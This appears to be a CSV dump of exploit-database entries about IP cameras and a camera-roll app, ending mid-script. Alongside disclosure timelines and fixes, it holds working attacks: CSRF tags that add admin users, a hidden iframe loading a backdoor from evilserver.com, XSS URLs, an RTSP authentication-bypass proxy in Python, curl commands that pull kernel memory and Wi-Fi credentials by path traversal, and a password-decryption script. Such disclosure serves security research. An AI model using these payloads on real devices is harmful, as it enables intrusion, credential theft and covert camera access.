2014-02-11,WebApps,iOS,Vulnerability-Lab,WiFi Camera Roll 1.2 iOS,Multiple Vulnerabilities,"http://www.vulnerability-lab.com/get_content.php?id=1192
http://localhost:8880/upload.ajax?qqfile=%20../\../\[LOCAL FILE/PATH INCLUDE VULNERABILITY!].jpg
http://localhost:8880/upload.ajax?qqfile=5d476cebd60705.gif.jpg.html.js.aspx.jpg
http://localhost:8880/
http://localhost:8880/upload.html
http://localhost:8880/upload.ajax?qqfile=","Document Title:
WiFi Camera Roll v1.2 iOS - Multiple Web Vulnerabilities
References (Source):
Release Date:
2014-02-08
Vulnerability Laboratory ID (VL-ID):
1192
Common Vulnerability Scoring System:
7.9
Product & Service Introduction:
Download or upload photos/videos via WiFi! It is a easy way to wirelessly access your photos/videos in camera roll on devices.
It only needs a web browser and not depends on any other transfer utilities. Just start the app and input the address into the
address bar of your browser, you can browser the photos/videos in camera roll on your device. What`s more, you can upload
photos/videos and it will help you save them into camera roll automatically.
- You can browser the photos in camera roll on device
- Download photos in full-size with EXIF metadata
- Upload the specified format images into camera roll
- Optional password protection for the web interface
- One app compatible for both iPhone and iPad
- Support major browsers e.g. Safari, Chrome, IE, etc.
- A web browser is enough and not depends on flash, java, etc.
- [NEW] Download unmodified HD quality video
- [NEW] Upload specified format videos directly into your camera roll
- [NEW] View photo gallery in web browser
I`m always keeping this app concise and easy to use. It is just a bridge to connect your iPhone/iPad and computer. All photos and
videos are saved in your system album and your computer. So it is safe and won`t lost even if you accidentally delete this app.
(Copy of the Homepage: https://itunes.apple.com/ch/app/wifi-camera-roll/id576954110 )
Abstract Advisory Information:
The Vulnerability Laboratory Research Team discovered multiple web vulnerabilities in the official WiFi Camera Roll v1.2 iOS mobile web-application.
Vulnerability Disclosure Timeline:
2014-02-08:    Public Disclosure (Vulnerability Laboratory)
Discovery Status:
Published
Affected Product(s):
Apple AppStore
Product: WiFi Camera Roll (iOS) - Application 1.2
Exploitation Technique:
Remote
Severity Level:
High
Technical Details & Description:
1.1
A local file/path include web vulnerability has been discovered in the official WiFi Camera Roll v1.2 iOS mobile web-application.
The local file include web vulnerability allows remote attackers to unauthorized include local file/path requests or system
specific path commands to compromise the web-application or mobile device.
The local file include web vulnerability is located in the vulnerable `qqfile` name value of the `upload files` module (web-interface).
Remote attackers are able to inject own files with malicious filename to compromise the mobile application. The attack vector is
persistent and the request method is POST. The local file/path include execute occcurs in the main file index section after the refresh
of the file upload. The security risk of the local file include web vulnerability is estimated as high(+) with a cvss (common vulnerability
scoring system) count of 7.8(+)|(-)7.9.
Exploitation of the local file include web vulnerability requires no user interaction or privileged web-application user account with password.
Successful exploitation of the local web vulnerability results in mobile application or connected device component compromise by unauthorized
local file include web attacks.
Request Method(s):
[+] [POST]
Vulnerable Input(s):
[+] Upload Files
Vulnerable Parameter(s):
[+] filename > qqfile
Affected Module(s):
[+] Access from Computer (File Dir Index List - Folder/Category to  path=/)
1.2
An arbitrary file upload web vulnerability has been discovered in the official WiFi Camera Roll v1.2 iOS mobile web-application.
The arbitrary file upload issue allows remote attackers to upload files with multiple extensions to bypass the web-server or system validation.
The vulnerability is located in the `upload file` (video and images) module. Remote attackers are able to upload a php or js web-shells by renaming
the file with multiple extensions to bypass the file restriction mechanism. The attacker uploads for example a web-shell with the following name
and extension `image.gif.jpg.html.js.aspx.jpg`. After the upload the attacker needs to open the file in the web application. He deletes the .jpg &
.gif file extension and can access the application with elevated access rights. The security risk of the arbitrary file upload web vulnerability is
estimated as high with a cvss (common vulnerability scoring system) count of 6.4(+)|(-)6.5.
Exploitation of the arbitrary file upload web vulnerability requires no user interaction or privilege application user account with password.
Successful exploitation of the vulnerability results in unauthorized file access because of a compromise after the upload of web-shells.
Request Method(s):
[+] [POST]
Vulnerable Module(s):
[+] Upload (GUI)
Vulnerable Parameter(s):
[+] filename > qqfile (multiple extensions)
Affected Module(s):
[+] File Dir Upload Ajax (http://localhost:8880/upload.ajax?qqfile=)
Proof of Concept (PoC):
The arbitrary file upload and local file include web vulnerability can be exploited by remote attackers without user interaction or privileged web user account.
For security demonstration or to reproduce the remote vulnerabilities follow the provided information and steps below.
1.1
PoC: File Include Vulnerability
1.2
PoC: Arbitrary File Upload
--- PoC 1.1 Session Logs [POST] ---
Status: pending[]
POST http://localhost:8880/upload.ajax?qqfile=[LOCAL FILE/PATH INCLUDE VULNERABILITY!].jpg Load Flags[LOAD_BYPASS_CACHE  ] Gr��e des Inhalts[unknown] Mime Type[unknown]
Request Header:
Host[localhost:8880]
User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0]
Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
Accept-Language[de-de,de;q=0.8,en-us;q=0.5,en;q=0.3]
Accept-Encoding[gzip, deflate]
X-Requested-With[XMLHttpRequest]
X-File-Name[8f11a581d505d476cebd607056e4c167621c2e61.jpg]
Cache-Control[no-cache]
Content-Type[application/octet-stream]
X-Mime-Type[image/jpeg]
Referer[http://localhost:8880/upload.html]
Content-Length[24386]
POST-Daten:
POST_DATA[����
--- PoC 1.2 Session Logs [POST] ---
Status: pending[]
POST http://localhost:8880/upload.ajax?qqfile=5d476cebd60705.gif.jpg.html.js.aspx.jpg Load Flags[LOAD_BYPASS_CACHE  ] Gr��e des Inhalts[unknown] Mime Type[unknown]
Request Header:
Host[localhost:8880]
User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0]
Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
Accept-Language[de-de,de;q=0.8,en-us;q=0.5,en;q=0.3]
Accept-Encoding[gzip, deflate]
X-Requested-With[XMLHttpRequest]
X-File-Name[8f11a581d505d476cebd607056e4c167621c2e61.jpg]
Cache-Control[no-cache]
Content-Type[application/octet-stream]
X-Mime-Type[image/jpeg]
Referer[http://localhost:8880/upload.html]
Content-Length[24386]
POST-Daten:
POST_DATA[����
Reference(s):
Solution - Fix & Patch:
1.1
The local file include vulnerability can be patched by a secure parse and encode of the vulnerable filename and qqfile values in the affected upload POST method request.
1.2
The arbitrary file upload vulnerability can be parsed by restriction and secure filter validation mechanism to prevent uploads of data with multiple file extensions.
Security Risk:
1.1
The security risk fo the local file include web vulnerability in the qqfile and filename values are estimated as high.
1.2
The security risk of the arbitrary file upload web vulnerability is estimated as high.
Credits & Authors:
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]
Disclaimer & Information:
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties,
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases
or trade with fraud/stolen material.
Domains:    www.vulnerability-lab.com   - www.vuln-lab.com       - www.evolution-sec.com
Contact:    admin@vulnerability-lab.com - research@vulnerability-lab.com        - admin@evolution-sec.com
Section:    www.vulnerability-lab.com/dev - forum.vulnerability-db.com        - magazine.vulnerability-db.com
Social:    twitter.com/#!/vuln_lab - facebook.com/VulnerabilityLab        - youtube.com/user/vulnerability0lab
Feeds:    vulnerability-lab.com/rss/rss.php- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php
Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),
modify, use or edit our material contact (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
Copyright � 2014 | Vulnerability Laboratory [Evolution Security]
VULNERABILITY LABORATORY RESEARCH TEAM
DOMAIN: www.vulnerability-lab.com
CONTACT: research@vulnerability-lab.com"
2014-01-14,WebApps,Hardware,Felipe Molina,Conceptronic Wireless Pan & Tilt Network Camera,Cross-Site Request Forgery,https://www.youtube.com/watch?v=URXEe_VRc74,"**General Details**
Affected Product: Conceptronic camera CIPCAMPTIWL
Tested Firmware: 21.37.2.49
Tested Web UI Firmware: 0.61.4.18
Assigned CVE: CVE-2013-7204
CVSSv2 Base Score: 5.8 (AV:N/AC:M/AU:N/C:P/I:P/A:N)
Vulnerability Type: Cross-Site Request Forgery [CWE-352]
Solution Status: Not Fixed
Vendor Notification Timeline:
- 23/12/2013: Contacting with technical support through their web
form http://www.conceptronic.net/supcon.php?action=init
- 23/12/2013: Contacting with general information email addres
(info@conceptronic.net) to inform about the vulnerability and request
suitable security or technical contact to send the complete details of
the CSRF.
- 25/12/2013: Contacting with public twitter accounts
@conceptronic and @conceptronic_es to request suitable security or
technical contact to send the complete details of the CSRF.
- 28/12/2013: Recontacting the technical support.
- 28/12/2013: Recontacting general information address
info@conceptronic.net.
- 02/01/2014: Trying to conntact with security@conceptronic.net y
vulnerabilities@conceptronic.net but they are non existent addresses.
- 03/01/2014: Involve Inteco CERT in the notification proccess.
- 08/01/2014: Inteco confirms that there is still no response from
Conceptronic.
None of the comunication atempts with the vendor received a response,
so I'm publishing the advisory to warn users and confirm the
vulnerability with you.
**Vulnerabilitty details**
The CSRF is present in the CGI formulary used to create and modify
users of the web interface of the camera (/set_users.cgi). This CSRF
would allow a malicious attacker to create users in the camera web
interface (including administrator users) if he is able to lure the
legitimate administrator of the camera to visit a web controlled by
the attacker.
An example of the process to exploit this vulnerability:
1- A webcam administrator is already logged in the camera web interface.
2- A malicious user knows it and send a link to this administrator
pointing to a web controlled by this attacker
(http://example.com/conceptronic_csrf.html). In this web, the attacker
placed an image with the following code:
<img alt=""csrf image""
src=""http://<victim_camera_server>/set_users.cgi?next_url=rebootme.htm&user1=attacker&pwd1=attacker&pri1=2&user2=&pwd2=&pri2=0&user3=&pwd3=&pri3=0&user4=&pwd4=&pri4=0&user5=&pwd5=&pri5=0&user6=&pwd6=&pri6=0&user7=&pwd7=&pri7=0&user8=&pwd8=&pri8=0"">
3- The webcam administrator visit the link.
4- The page http://example.com/test_csrf.html tries to load the image
by making a GET request to the pointed URL, thus, making the
legitimate administrator to create a new user identified by ""attacker""
and password ""attacker"".
A video was uploaded to youtube showing this behaviour:
This issue can be fixed by adding an additional step to the user
creation CGI, either requesting the administrator password again
before creating/modifying any user or creating a hidden random token
for each form (https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)
Felipe Molina de la Torre"
2007-09-14,WebApps,CGI,Seth Fogie,Axis Communications 207W Network Camera,Web Interface '/admin/restartMessage.shtml?server' Cross-Site Request Forgery,"source: https://www.securityfocus.com/bid/25678/info
http://www.example.com/admin/restartMessage.shtml?server=<iframe%20style=visibility:hidden%20src=http://www.evilserver.com/wifi/axisbd.php><iframe","Axis Communications 207W Network Camera is prone to multiple vulnerabilities in the web interface. Three issues were reported: a cross-site scripting vulnerability, a cross-site request-forgery vulnerability, and a denial-of-service vulnerability.
Exploiting these issues may allow an attacker to compromise the device or to prevent other users from using the device.
Root the camera/add a backdoor -
src=http://www.evilserver.com/wifi/axisrb.htm><!â??"
2007-09-14,WebApps,CGI,Seth Fogie,Axis Communications 207W Network Camera,Web Interface 'axis-cgi/admin/pwdgrp.cgi' Multiple Cross-Site Request Forgery Vulnerabilities,"source: https://www.securityfocus.com/bid/25678/info
http://www.example.com/axis-cgi/admin/pwdgrp.cgi?action=add&user=owner1&grp=axuser&sgrp=axview:axoper:axadmin&pwd=owner1&comment=WebUser&return_page=/admin/users_set.sh","Axis Communications 207W Network Camera is prone to multiple vulnerabilities in the web interface. Three issues were reported: a cross-site scripting vulnerability, a cross-site request-forgery vulnerability, and a denial-of-service vulnerability.
Exploiting these issues may allow an attacker to compromise the device or to prevent other users from using the device.
Add a new administrator -
+tml%3Fpageclose%3D1"
2007-09-14,WebApps,CGI,Seth Fogie,Axis Communications 207W Network Camera,Web Interface axis-cgi/admin/restart.cgi Cross-Site Request Forgery,source: https://www.securityfocus.com/bid/25678/info,"Axis Communications 207W Network Camera is prone to multiple vulnerabilities in the web interface. Three issues were reported: a cross-site scripting vulnerability, a cross-site request-forgery vulnerability, and a denial-of-service vulnerability.
Exploiting these issues may allow an attacker to compromise the device or to prevent other users from using the device.
Reboot the camera - http://www.example.com/axis-cgi/admin/restart.cgi"
2013-11-08,WebApps,Hardware,Core Security,Vivotek IP Cameras,RTSP Authentication Bypass,"http://corelabs.coresecurity.com
http://www.coresecurity.com/advisories/vivotek-ip-cameras-rtsp-authentication-bypass
# poc.py
# The contents of this software are copyright (c) 2013 CORE Security and
# and are licensed under a Creative Commons Attribution Non-Commercial
# License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
# WARRANTIES ARE DISCLAIMED. IN NO EVENT SHALL CORE SDI Inc. BE LIABLE
# FOR ANY DIRECT,  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR
# CONSEQUENTIAL  DAMAGES RESULTING FROM THE USE OR MISUSE OF
# THIS SOFTWARE.
# Create TCP listener socket
# Wait until a new connection arises
# Create forwarder socket
# Pipe them!
http://corelabs.coresecurity.com.
http://www.coresecurity.com.
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.","Core Security - Corelabs Advisory
Vivotek IP Cameras RTSP Authentication Bypass
1. *Advisory Information*
Title: Vivotek IP Cameras RTSP Authentication Bypass
Advisory ID: CORE-2013-0704
Advisory URL:
Date published: 2013-11-05
Date of last update: 2013-11-05
Vendors contacted: Vivotek
Release mode: Coordinated release
2. *Vulnerability Information*
Class: Authentication issues [CWE-287]
Impact: Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-4985
3. *Vulnerability Description*
A security vulnerability was found in Vivotek IP cameras [1] that could
allow an unauthenticated remote attacker to bypass the RTSP basic
authentication and access the video stream.
4. *Vulnerable Packages*
. Vivotek IP cameras with firmware 0105a.
. Vivotek IP cameras with firmware 0105b.
. This vulnerability was tested against Vivotek IP cameras IP7160,
IP7361 and IP8332. Other Vivotek cameras and firmware are probably
affected too, but they were not checked.
5. *Vendor Information, Solutions and Workarounds*
Vendor released the beta firmware 0301c [2] and notifies that it should
be the formal release [2013-10-28]; contact vendor for further
information. Some mitigation actions for this issue may be:
. Do not expose the camera to internet unless absolutely necessary.
. Filter RTSP traffic (default port 554) if possible.
6. *Credits*
This vulnerability was discovered and researched by Martin Di Paola from
Core Security QA Team. The PoC of was made by Martin Di Paola with help
of Martin Rocha from Core Development Team. The publication of this
advisory was coordinated by Fernando Miranda from Core Advisories Team.
7. *Technical Description / Proof of Concept Code*
7.1. *RTSP Authentication Bypass*
This vulnerability is triggered by sending specially crafted RTSP
packets to remote TCP port 554. In order to run the proof of concept,
follow the next steps:
1. Set the camera RTSP authentication to 'basic'.
2. (Assuming that the camera is located in 192.168.1.1) Run 'poc.py'
with these parameters: 'python poc.py 9999 192.168.1.1 554'
3. Open a VLC media player and go to: 'Media > Open Network Stream'.
4. Enter the following network URL: 'rtsp://localhost:9999/live.sdp'.
5. A dialog box will asks for user/password, just click 'OK'.
6. You should see the RTSP live video stream; i.e., the RTSP basic
authentication can by bypassed by a remote attacker.
(c) 2013 CoreLabs,
Share-Alike 3.0 (United States)
import sys
from socket import *
from threading import Thread
import time
LOGGING = 1
def log(s):
if LOGGING:
print '(%s) %s' % (time.ctime(), s)
class UDPRequestHandler(Thread):
def __init__(self, data_to_send, recv_addr, dst_addr):
Thread.__init__(self)
self.data_to_send = data_to_send
self.recv_addr = recv_addr
self.dst_addr = dst_addr
def run(self):
sender = socket(AF_INET, SOCK_DGRAM)
sender.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
sender.sendto(self.data_to_send, self.dst_addr)
response = sender.recv(1024)
sender.sendto(response, self.recv_addr)
sender.close()
class UDPDispatcher(Thread):
dispatchers = []
def __has_dispatcher_for(self, port):
return any([d.src_port == port for d in UDPDispatcher.dispatchers])
def __init__(self, src_port, dst_addr):
Thread.__init__(self)
if self.__has_dispatcher_for(src_port):
raise Exception('There is already a dispatcher for port %d'
% src_port)
self.src_port = src_port
self.dst_addr = dst_addr
UDPDispatcher.dispatchers.append(self)
def run(self):
listener = socket(AF_INET, SOCK_DGRAM)
listener.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
listener.bind(('', self.src_port))
while 1:
try:
data, recv_addr = listener.recvfrom(1024)
if not data: break
UDPRequestHandler(data, recv_addr, self.dst_addr).start()
except Exception as e:
print e
break
listener.close()
UDPDispatcher.dispatchers.remove(self)
class PipeThread(Thread):
pipes = []
def __init__(self, source, sink, process_data_callback=lambda x: x):
Thread.__init__(self)
self.source = source
self.sink = sink
self.process_data_callback = process_data_callback
PipeThread.pipes.append(self)
def run(self):
while 1:
try:
data = self.source.recv(1024)
data = self.process_data_callback(data)
if not data: break
self.sink.send(data)
except Exception as e:
log(e)
break
PipeThread.pipes.remove(self)
class TCPTunnel(Thread):
def __init__(self, src_port, dst_addr, process_data_callback=lambda
x: x):
Thread.__init__(self)
log('[*] Redirecting: localhost:%s -> %s:%s' % (src_port,
dst_addr[0], dst_addr[1]))
self.dst_addr = dst_addr
self.process_data_callback = process_data_callback
self.sock = socket(AF_INET, SOCK_STREAM)
self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
self.sock.bind(('', src_port))
log('[*] Check live stream in rtsp://localhost:%d/live.sdp' %
src_port)
self.sock.listen(5)
def run(self):
while 1:
newsock, address = self.sock.accept()
fwd = socket(AF_INET, SOCK_STREAM)
fwd.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
fwd.connect(self.dst_addr)
PipeThread(newsock, fwd, self.process_data_callback).start()
PipeThread(fwd, newsock, self.process_data_callback).start()
class Camera():
def __init__(self, address):
self.address = address
def get_describe_data(self):
return ''
class Vivotek(Camera):
def __init__(self, address):
Camera.__init__(self, address)
def get_describe_data(self):
return 'v=0\r\no=RTSP 836244 0 IN IP4 0.0.0.0\r\ns=RTSP
server\r\nc=IN IP4 0.0.0.0\r\nt=0
0\r\na=charset:Shift_JIS\r\na=range:npt=0-\r\na=control:*\r\na=etag:1234567890\r\nm=video
0 RTP/AVP 96\r\nb=AS:1200\r\na=rtpmap:96
MP4V-ES/30000\r\na=control:trackID=1\r\na=fmtp:96
profile-level-id=3;config=000001B003000001B509000001000000012000C48881F4514043C1463F;decode_buf=76800\r\nm=audio
0 RTP/AVP 97\r\na=control:trackID=3\r\na=rtpmap:97
mpeg4-generic/16000/2\r\na=fmtp:97 streamtype=5; profile-level-id=15;
mode=AAC-hbr; config=1410;SizeLength=13; IndexLength=3;
IndexDeltaLength=3; CTSDeltaLength=0; DTSDeltaLength=0;\r\n'
class RTSPAuthByPasser():
DESCRIBE_REQ_HEADER = 'DESCRIBE rtsp://'
UNAUTHORIZED_RESPONSE = 'RTSP/1.0 401 Unauthorized'
SERVER_PORT_ARGUMENTS = 'server_port='
DEFAULT_CSEQ = 1
DEFAULT_SERVER_PORT_RANGE = '5556-5559'
def __init__(self, local_port, camera):
self.last_describe_req = ''
self.camera = camera
self.local_port = local_port
def start(self):
log('[!] Starting bypasser')
TCPTunnel(self.local_port, self.camera.address,
self.spoof_rtsp_conn).start()
def spoof_rtsp_conn(self, data):
auth_string = ""Authorization: Basic""
if auth_string in data:
data = data.split(""\r\n"")
new_data = []
for line in data:
new_data.append(line if auth_string not in line else
auth_string + "" a"")
data = ""\r\n"".join(new_data)
return data
if __name__ == '__main__':
if len(sys.argv) > 1:
listener_port = camera_port = int(sys.argv[1])
camera_ip = sys.argv[2]
if len(sys.argv) == 4:
camera_port = int(sys.argv[3])
RTSPAuthByPasser(listener_port, Vivotek((camera_ip,
camera_port))).start()
else:
print 'usage: python %s [local_port] [camera_ip]
[camera_rtsp_port]'
8. *Report Timeline*
. 2013-07-04:
Core Security Technologies attempts to report the vulnerability.
Publication date set to July 30th, 2013.
. 2013-07-08:
Core attempts to contact vendor.
. 2013-07-22:
Core attempts to contact vendor.
. 2013-07-30:
First release date missed.
. 2013-07-30:
Core notifies the Vivotek team of the vulnerability.
. 2013-08-01:
Vendor asks for a report with technical information.
. 2013-08-01:
Technical details sent to Vivotek team.
. 2013-08-05:
Core asks for a status update.
. 2013-08-05:
Vendor notifies that the reported issue is being evaluated.
. 2013-08-12:
Core asks for a status update and re-schedules the advisory publication
for Aug 28th.
. 2013-08-15:
Vendor notifies that authentication in RTSP streaming is disabled by
default and the reported issue is not a vulnerability.
. 2013-08-27:
Core notifies that the PoC was tested against Vivotek IP cameras IP7160,
IP8332 and IP7361, with basic authentication enabled, and all targets
were vulnerable. Core re-sends a PoC and additional technical details.
. 2013-08-28:
Vendor confirms the issue and notifies that a patched firmware will be
released in the future.
. 2013-08-28:
Second release date missed.
. 2013-09-02:
Core asks for a specific release date and re-schedules the advisory
publication for Sep 11th.
. 2013-09-03:
Vendor notifies that they have a solution that is being tested. The
solution will be released in the newest models first.
. 2013-09-09:
Core asks for a status update regarding the release date.
. 2013-09-10:
Vendor notifies that the testing process will probably finish before
Sep. 27th.
. 2013-09-11:
Third release date missed.
. 2013-09-30:
Core asks for a status update.
. 2013-09-30:
Vendor notifies that they found other issues on this version and asks
for delaying the release.
. 2013-10-17:
Core asks for a status update and a tentative release date.
. 2013-10-17:
Vendor notifies that a firmware beta version is being tested [2].
. 2013-10-28:
Core notifies that the advisory was re-scheduled to be published next
Tuesday and that date should be considered final.
. 2013-10-28:
Vendor notifies that the firmware beta release 0301c [2] should be the
formal release.
. 2013-11-05:
Advisory CORE-2013-0704 published.
9. *References*
[1] http://www.vivotek.com/web/product/NetworkCameras.aspx
[2]
ftp://fae:fae@ftp.vivotek.com/Firmware/IP8332/Beta/IP8332-VVTK-0301c.flash.pkg
10. *About CoreLabs*
CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies. We conduct our research in several important
areas of computer security including system vulnerabilities, cyber
attack planning and simulation, source code auditing, and cryptography.
Our results include problem formalization, identification of
vulnerabilities, novel solutions and prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers,
project information and shared software tools for public use at:
11. *About Core Security Technologies*
Core Security Technologies enables organizations to get ahead of threats
with security test and measurement solutions that continuously identify
and demonstrate real-world exposures to their most critical assets. Our
customers can gain real visibility into their security standing, real
validation of their security controls, and real metrics to more
effectively secure their organizations.
Core Security's software solutions build on over a decade of trusted
research and leading-edge threat expertise from the company's Security
Consulting Services, CoreLabs and Engineering groups. Core Security
Technologies can be reached at +1 (617) 399-6980 or on the Web at:
12. *Disclaimer*
The contents of this advisory are copyright (c) 2013 Core Security
Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
13. *PGP/GPG Keys*
This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at"
2006-06-11,WebApps,PHP,Jaime Blasco,FlexWATCH Network Camera,Cross-Site Scripting,"source: https://www.securityfocus.com/bid/18936/info
http://www.example.com/camera/%3Cscript%3Ealert('www.eazel.es')%3C/script%3E ]","FlexWATCH Network Camera is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.
An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
FlexWATCH 3.0 and prior versions are affected."
2006-05-17,Remote,Hardware,Jaime Blasco,obotix IP Camera M1 1.9.4 .7/M10 2.0.5.2,'eventplayer?get_image_info_abspath' Cross-Site Scripting,"source: https://www.securityfocus.com/bid/18022/info
http://www.example.com/control/eventplayer?get_image_info_abspath=%3CBODY%20ONLOAD=alert(&#039;www.eazel.es&#039;)%3E","The Mobotix IP camera is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the device to properly sanitize user-supplied input.
An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks."
2006-05-17,Remote,Hardware,Jaime Blasco,obotix IP Camera M1 1.9.4 .7/M10 2.0.5.2,'events.tar?source_ip' Cross-Site Scripting,"source: https://www.securityfocus.com/bid/18022/info
http://www.example.com/control/events.tar?source_ip=%3CBODY%20ONLOAD=alert(&#039;www.eazel.es&#039;)%3E&download=egal","The Mobotix IP camera is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the device to properly sanitize user-supplied input.
An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks."
2006-05-17,Remote,Hardware,Jaime Blasco,obotix IP Camera M1 1.9.4 .7/M10 2.0.5.2,help Script Cross-Site Scripting,"source: https://www.securityfocus.com/bid/18022/info
http://www.example.com/help/help?%3CBODY%20ONLOAD=alert(&#039;www.eazel.es&#039;)%3E","The Mobotix IP camera is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the device to properly sanitize user-supplied input.
An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks."
2013-08-26,WebApps,Hardware,Craig Young,Loftek Nexus 543 IP Cameras,Multiple Vulnerabilities,"#!/bin/sh
# This script exploits CVE-2013-3311 to retrieve kernel memory from a Loftek Nexus 543 IP camera
# The file which is downloaded can be analyzed (strings) to recover passwords and other goodies
#!/bin/sh
# This script exploits CVE-2013-3314 to retrieve wifi credentials from a Loftek Nexus 543 IP camera","CSRF:
<HTML><TITLE>Loftek Nexus 543 CSRF PoC</TITLE>
<IMG SRC=""http://ip-camera-address/set_users.cgi?next_url=rebootme.htm&user1=admin&pwd1=password&pri1=2&user2=anon&pwd2=password&pri2=0&user3=&pwd3=&pri3=1&user4=&pwd4=&pri4=0&user5=&pwd5=&pri5=0&user6=&pwd6=&pri6=0&user7=&pwd7=&pri7=0&user8=&pwd8=&pri8=0"" ALT=""Your password has been reset to admin/password"">
</HTML>
Memory Dump:
if [[ ""$1x"" != ""x"" && ""$2x"" != ""x"" ]]; then
curl http://$1/../proc/kcore -o $2
exit
fi
echo ""Usage: $0 Nexus-543-IP output_file""
WiFi Creds:
if [ ""$1x"" != ""x"" ]; then
curl http://$1/../etc/RT2870STA.dat
exit
fi
echo ""Usage: $0 Nexus-543-IP"""
2013-08-07,WebApps,Hardware,Core Security,Hikvision IP Cameras 4.1.0 b130111,Multiple Vulnerabilities,"http://corelabs.coresecurity.com/
http://www.coresecurity.com/advisories/hikvision-ip-cameras-multiple-vulnerabilities
# Important: We're assuming the last 4 bytes of the file's plaintext
# zero, hence there we have the key. There are other easy ways to
# calculate this tho.
http://www.hikvision.com/en/products_show.asp?id=506.
http://www.hikvision.com/En/US/contactHikvision.asp.
http://corelabs.coresecurity.com.
http://www.coresecurity.com.
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.","Core Security - Corelabs Advisory
Hikvision IP Cameras Multiple Vulnerabilities
1. *Advisory Information*
Title: Hikvision IP Cameras Multiple Vulnerabilities
Advisory ID: CORE-2013-0708
Advisory URL:
Date published: 2013-08-06
Date of last update: 2013-08-06
Vendors contacted: Hikvision
Release mode: User release
2. *Vulnerability Information*
Class: Input validation error [CWE-20], Use of Hard-coded Credentials
[CWE-798], Buffer overflow [CWE-119]
Impact: Code execution, Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-4975, CVE-2013-4976, CVE-2013-4977
3. *Vulnerability Description*
Multiple vulnerabilities have been found in Hikvision IP camera
DS-2CD7153-E [1] (and potentially other cameras sharing the affected
firmware [2]) that could allow a remote attacker:
1. [CVE-2013-4975] To obtain the admin password from a non-privileged
user account.
2. [CVE-2013-4976] To bypass the anonymous user authentication using
hard-coded credentials (even if the built-in anonymous user account was
explicitly disabled).
3. [CVE-2013-4977] To execute arbitrary code without authentication
by exploiting a buffer overflow in the RTSP packet handler.
4. *Vulnerable Packages*
. Hikvision-DS-2CD7153-E IP camera with firmware v4.1.0 b130111 (Jan
2013).
. Other devices based on the same firmware [2] are probably affected
too, but they were not checked.
5. *Vendor Information, Solutions and Workarounds*
There was no official answer from Hikvision after several attempts (see
[Sec. 8]); contact vendor for further information. Some mitigation
actions may be:
. Do not expose the camera to internet unless absolutely necessary.
. Have at least one proxy filtering HTTP requests to
'/PSIA/System/ConfigurationData'.
. Have at least one proxy filtering the 'Range' parameter in RTSP
requests.
6. *Credits*
. [CVE-2013-4975] was discovered and researched by Alberto Solino
from Core Security.
. [CVE-2013-4976] was discovered and researched by Alejandro
Rodriguez from Core Exploit QA Team.
. [CVE-2013-4977] was discovered Anibal Sacco. Analysis and research
by Anibal Sacco and Federico Muttis from Core Exploit Writers Team.
. The publication of this advisory was coordinated by Fernando
Miranda from Core Advisories Team.
7. *Technical Description / Proof of Concept Code*
7.1. *Privilege Escalation through ConfigurationData Request*
[CVE-2013-4975] The following script allows obtaining the administrator
password by requesting the camera's configuration data and breaking its
trivial encryption. A valid user account is needed to launch the attack.
import urllib2
import base64
import argparse
import sys
def decrypt(config):
are
print '[*] Decrypting config'
key = config[-4:]
plaintext = ''
for i in range(len(config)/4):
for j in range(4):
plaintext += chr(ord(config[i*4+j]) ^ ord(key[j]))
return plaintext
def attack(target, username, password, output):
